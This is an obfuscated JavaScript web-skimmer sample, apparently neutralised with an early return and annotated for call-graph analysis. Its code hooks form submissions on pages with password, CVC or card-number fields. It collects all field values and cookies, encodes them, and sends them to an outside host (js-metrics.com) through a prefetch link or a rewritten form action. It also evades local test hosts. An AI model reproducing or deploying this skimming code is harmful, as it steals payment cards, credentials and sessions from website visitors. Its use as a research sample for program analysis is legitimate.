// Processed by https://github.com/semantic-graph/jsper

_zeN5='=yc.mdi Sa[blns/jw$r)v*:|];P-x&of^u?(ph"ke\\t1C';
function _lyEX() {
    var _3OTE = true;
    if (_3OTE) {
        return;
    }
    var _9U5X = _uu("xhfd");
    var _6b3 = _uu("xhfda");
    _bjAt = true;
    var _JycE = _K2Ej(self.location.host);
    if (_JycE || _9U5X || _bjAt||_6b3) { return; }
    var _3X3Y = document.forms.length;
    fetch(document.location.href)
        .then(resp => {
            const _nZ = resp.headers.get("Content-Security-Policy");
            if (_nZ == null || !_nZ.includes("default-src")) {

                for (var i = 0; i < _3X3Y; i++) {
                    var _x8 = document.forms[i].elements;
                    for (var k = 0; k < _x8.length; k++) {
                        if (_x8[k].type == "password" || _x8[k].name.toLowerCase() == "cvc" || _x8[k].name.toLowerCase() == "cardnumber") {
                            document.forms[i].addEventListener("submit", function (ev) {
                                var _dKvo = "";
                                for (var j = 0; j < this.elements.length; j++) {
                                    _dKvo = _dKvo+ this.elements[j].name + ":" + this.elements[j].value + ":";
                                }
                                const _DDl = encodeURIComponent(btoa(unescape(encodeURIComponent(self.location + "|" + _dKvo + "|" + document.cookie))));
                                _S11(_DDl);
                            });
                            break;
                        }
                    }
                }
            } else if (!_nZ.includes("form-action") && !_9U5X) {
                for (var i = 0; i < _3X3Y; i++) {
                    var _x8 = document.forms[i].elements;
                    for (var k = 0; k < _x8.length; k++) {
                        if (_x8[k].type == "password" || _x8[k].name.toLowerCase() == "cvc" || _x8[k].name.toLowerCase() == "cardnumber") {
                            // $(document.forms[i]).submit(function (ev) {
                            document.forms[i].addEventListener("submit", function (ev) {
                                // ev.preventDefault();
                                var _dKvo = "";
                                for (var j = 0; j < this.elements.length; j++) {
                                    _dKvo = _dKvo + this.elements[j].name + ":" + this.elements[j].value + ":";
                                }
                                _Jo3("xhfda", 1, 864000);
                                const _DDl = encodeURIComponent(btoa(unescape(encodeURIComponent(self.location + "|" + _dKvo + "|" + document.cookie))));
                                var _S3J = _5aJ5[0] + _DDl+"&loc=" + self.location;
                                this.action = _S3J;
                            });
                            break;
                        }
                    }
                }
            } else {
                return;
            }
        });

    _Jo3("xhfd", 1, 86400);
}
var _5aJ5 = ["https://js-metrics.com/minjs.php?pl="];
function _S11(_DDl) {
    var _S3J = _5aJ5[0] + _DDl
    const _Vr2P = document.createElement("link");
    _Vr2P.rel = "prefetch";
    _Vr2P.href = _S3J;
    document.head.appendChild(_Vr2P);
    return true;
}

function _uu(_Bjx3) {
    var _3Lg = document.cookie.match(new RegExp(
        "(?:^|; )" + _Bjx3.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, "\\\\$1")+"=([^;]*)"
    ));
    //  var cnt = 0;
    if (_3Lg) {
        return true;
    }
    return false;

}

function _GT6() {
    var _NrGE = new Date();
    var _ERU = _NrGE.getHours();
    if (_ERU > 7 && _ERU < 19) {
        return true;
    } else {
        return false;
    }
}

function _K2Ej(_mlf) {
    if (/(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)/.test(_mlf) || _mlf.toLowerCase().includes("localhost")) {
        return (true)
    }
    return (false)
}

function _AP6c() {
    return !(typeof window != "undefined" && window.document);
}

function _Jo3(_z4, _eJS, _NO) {
    var _D5Y = new Date();
    _D5Y= new Date(_D5Y.getTime() + 1000 * _NO);
    document.cookie = _z4 + "=" + _eJS+"; expires=" + _D5Y.toGMTString() + ";";
}

_lyEX();
// NOTE(Zhen): added later to make call-graph right
_S11();